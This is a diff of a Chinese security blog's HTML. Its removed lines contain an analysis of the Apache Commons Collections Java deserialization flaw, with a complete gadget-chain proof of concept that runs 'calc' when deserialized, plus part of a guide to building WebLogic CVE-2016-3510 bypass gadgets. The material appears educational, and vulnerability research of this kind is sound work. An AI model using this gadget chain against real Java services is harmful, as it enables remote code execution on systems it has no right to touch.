-<p>尝试使用<code>invokeTransformer</code>来执行命令。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformerTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">       InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String(<span class="string">"calc"</span>)&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来得寻找会自动调用<code>InvokerTransformer</code>类中的<code>transform()</code>方法，构造代码执行。明显调用<code>transform()</code>方法有以下两个类：</p>
-<ul>
-<li>TransformedMap</li>
-<li>LazyMap</li>
-</ul>
-<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>Apache Commons Collections 中实现了类<code>TransformedMap</code>，用来对<code>Map</code>进行某种变换。只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>其中，<strong>Transformer参数 是定义的如何变换的函数</strong>。</li>
-<li>Map中的任意项的Key或者Value被修改，相应的Transformer(keyTransformer或者valueTransformer)的<code>transform</code>方法就会被调用。</li>
-</ul>
-<p><code>TransformedMap</code>实现了Map接口，并且其中有个<code>setValue</code>方法，每当调用map的<code>setValue</code>方法时，该方法将会被调用。</p>
-<p><code>TransformedMap</code>父类<code>AbstractInputCheckedMapDecorator</code>类中有对setValue的重写:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>跟进<code>checkSetValue</code>，此处会调用<code>transform</code>方法。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>流程即为：<code>setValue ==&gt; checkSetValue  ==&gt;  valueTransformer.transform(value)</code>。</p>
-<p>好的，现在已经找到了反射调用的上一步调用，这里为了多次进行多次反射调用，我们可以将多个 <code>InvokerTransformer</code>实例级联在一起组成一个 <code>ChainedTransformer</code> 对象，在其调用的时候会进行一个级联 <code>transform()</code> 调用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class ChainedTransformer implements Transformer, Serializable &#123;</span><br><span class="line">...省略...</span><br><span class="line">    public Object transform(Object object) &#123;</span><br><span class="line">        for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>这个函数迭代了所有<code>Transformer</code>类中<code>transform</code>方法，并将传回来的object对象放到下一个<code>Transformer</code>中进行使用。</p>
-<p>这里还有一个<code>ConstantTransformer</code>类，它只是返回我们传进去的对象。于是我们可以传入<code>Runtime.class</code>对象,就能进行命令执行操作了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> constantToReturn  the constant to return each time</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这样就可以形成我们一个执行任意代码的执行链了：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,                  <span class="comment">//方法名</span></span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,  <span class="comment">//参数类型</span></span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;), <span class="comment">//参数值</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, </span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, </span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"calc"</span>&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-<p>通过上述分析的触发条件，生成一个<code>TransformedMap</code>，并且修改这个Map的value值，即可触发。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class payloadTest &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">             new ConstantTransformer(Runtime.class),</span><br><span class="line">             new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">             new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">             new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        Map inMap = new HashMap();</span><br><span class="line">        inMap.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line">        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);//生成</span><br><span class="line"></span><br><span class="line">        for (Iterator iterator = outMap.entrySet().iterator(); iterator.hasNext();)&#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) iterator.next();</span><br><span class="line">            entry.setValue(&quot;123&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行并弹出计算器。</p>
-<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code>实现了<code>Map</code>接口，其中的<code>get(Object)</code>方法调用了<code>transform()</code>方法，跟进函数进去</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里可以看到，在调用<code>transform()</code>方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的<code>factory.transform()</code>进行处理，跟踪<code>facory</code>变量找到<code>decorate()</code>方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="line">    return new LazyMap(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里的<code>decorate()</code>方法会对<code>factory</code>进行初始化，同时实例化一个<code>LazyMap</code>，为了能成功调用<code>transform()</code>方法，找到了<code>LazyMap</code>，发现在<code>get()</code>方法中调用了<code>transform()</code>方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的<code>get(Object)</code>方法。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>上面的<code>TransformedMap</code>的<code>setValue()</code>还是<code>LazyMap</code>的<code>get()</code>方法都是需要手动调用。现在希望的是在序列化数据反序列化时，执行<code>readObject()</code>方法，并自动触发。</p>
-<p>这里配合我们执行代码的类就是<code>AnnotationInvocationHandler</code>，该类是java运行库中的一个类，并且包含一个<code>Map</code>对象属性，其<code>readObject</code>方法有自动修改自身Map属性的操作。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"> </span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    <span class="keyword">this</span>.type = type;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);<span class="comment">//判断第一个参数是否为AnnotationType，因此使用Retention.class传入较好。  </span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||    <span class="comment">// 获取的值不是annotationType类型，便会触发setValue。这里只需用简单的String即可触发。</span></span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(               <span class="comment">// 此处触发一些列的Transformer</span></span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以注意到 <code>memberValue</code> 是 <code>AnnotationInvocationHandler</code> 类中类型声明为 <code>Map&lt;String, Object&gt;</code> 的成员变量，刚好和之前构造的 <code>TransformedMap</code> 类型相符，因此我们可以通过 Java 的反射机制动态的获取 <code>AnnotationInvocationHandler</code> 类，使用精心构造好的 <code>TransformedMap</code> 作为它的实例化参数，然后将实例化的 <code>AnnotationInvocationHandler</code> 进行序列化得到二进制数据，最后传递给具有相应环境的序列化数据交互接口使之触发命令执行的 Gadget。利用测试代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionPayload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Runtime.getRuntime().exec("calc");</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map inMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        inMap.put(<span class="string">"key"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outMap = TransformedMap.decorate(inMap, <span class="keyword">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123; Class.class, Map.class &#125;);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(<span class="keyword">new</span> Object[] &#123; Retention.class, outMap &#125;);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">// 触发代码执行</span></span><br><span class="line">        Object newObj = ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
-<li><a href="http://www.angelwhu.com/blog/?p=394" target="_blank" rel="noopener">java反序列化漏洞原理分析</a></li>
-<li><a href="http://www.beesfun.com/2017/05/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">JAVA反序列化漏洞知识点整理</a></li>
-<li><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">Lib之过？Java反序列化漏洞通用利用分析</a></li>
-</ul>
-
-          
+          Apache Commons-Collections 简介Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Colle
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/15/Java反序列化之Commons-Collections/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -975,55 +807,16 @@
       
         
           
-            <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>  想要生成 Weblogic Deserialization RCE(CVE-2016-3510) 的payload，利用<code>weblogic.corba.utils.MarshallObject</code>的反序列化来绕过 Weblogic 的黑名单，从而执行恶意代码。</p>
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>  SerialKiller 是一个用来绕过可预见的<code>ObjectInputStreams</code>防御反序列化措施，生成用于Java反序列化的 Gadget chains 的工具的集合。</p>
-<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><code>https://github.com/pwntester/SerialKillerBypassGadgetCollection</code></p>
-<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>  从 Requirements 中可以看到所需要的依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ysoserial-0.0.5-SNAPSHOT-all.jar</span><br><span class="line">com.ibm.jaxws.thinclient_8.5.0.jar</span><br><span class="line">com.ibm.ws.ejb.embeddableContainer_8.5.0.jar</span><br><span class="line">com.oracle.weblogic.iiop-common.jar</span><br><span class="line">com.ibm.mq.jmqi.jar</span><br><span class="line">com.ibm.ws.ejb.thinclient_8.5.0.jar</span><br><span class="line">com.ibm.msg.client.jms.jar</span><br><span class="line">com.ibm.ws.runtime.coregroupbridge.jar</span><br></pre></td></tr></table></figure></p>
-<p>先解决上面的所需依赖。</p>
-<ol>
-<li><code>ysoserial-0.0.5-SNAPSHOT-all.jar</code><ul>
-<li>这个去<a href="https://github.com/frohoff/ysoserial/releases" target="_blank" rel="noopener">ysoserial</a>这里下载就可以了。如果下载的是其他版本的，要在<code>pom.xml</code>中改成对应版本。</li>
-</ul>
-</li>
-<li><code>com.oracle.weblogic.iiop-common.jar</code><ul>
-<li>这个是 Weblogic 里面的一个包，在本地安装的 Weblogic 中没有找到这个包，倒是在 GitHub 中搜到了，<a href="https://raw.githubusercontent.com/shainaBajaj/BitsProject/master/medrec_project/test/Oracle/Middleware/Oracle_Home/wlserver/modules/com.oracle.weblogic.iiop-common.jar" target="_blank" rel="noopener">下载地址</a></li>
-</ul>
-</li>
-<li><p><code>com.ibm.*</code></p>
-<ul>
-<li><p>这些包都是 Websphere 里面的。从 Docker Hub 中下载 Webspher。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull amanly/websphere_8_5_5</span><br></pre></td></tr></table></figure>
-<p>启动之后，进入容器内部，将上面的包一个一个找出来就行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;com.ibm.jaxws.thinclient_8.5.0.jar&quot;</span><br></pre></td></tr></table></figure>
-<p>将6个包打包，在外部下载出来。</p>
-</li>
-</ul>
-</li>
-</ol>
-<p>除了上述依赖，在编译过程中，还遇到到缺失以下几个依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-scxml2-2.0-SNAPSHOT.jar</span><br><span class="line">jai_core-1.1.3.jar</span><br></pre></td></tr></table></figure></p>
-<ol>
-<li><code>commons-scxml2-2.0-SNAPSHOT.jar</code> <ul>
-<li>百度搜一下，<a href="http://pan.baidu.com/s/1bnsjHWN" target="_blank" rel="noopener">下载地址</a></li>
-</ul>
-</li>
-<li><code>jai_core-1.1.3.jar</code><ul>
-<li>这个包是因为在 Maven 源上被删除了。谷歌一下，<a href="http://download.osgeo.org/webdav/geotools/javax/media/jai_core/1.1.3/" target="_blank" rel="noopener">下载地址</a>,下面还要修改<code>pom.xml</code>。</li>
-</ul>
-</li>
-</ol>
-<p>到此，所以的依赖都已经准备好了，在项目根目录中，新建<code>external</code>文件夹，将上面的10个包放进文件夹中。</p>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>先解决<code>jai_core</code>依赖问题，修改<code>pom.xml</code>，在<code>maven-install-plugin</code>加一个<code>execution</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;execution&gt;</span><br><span class="line">    &lt;id&gt;install-jai&lt;/id&gt;</span><br><span class="line">    &lt;phase&gt;clean&lt;/phase&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;file&gt;$&#123;basedir&#125;/external/jai_core-1.1.3.jar&lt;/file&gt;</span><br><span class="line">        &lt;repositoryLayout&gt;default&lt;/repositoryLayout&gt;</span><br><span class="line">        &lt;groupId&gt;javax.media&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jai_core&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1.3&lt;/version&gt;</span><br><span class="line">        &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">        &lt;generatePom&gt;true&lt;/generatePom&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">    &lt;goals&gt;</span><br><span class="line">        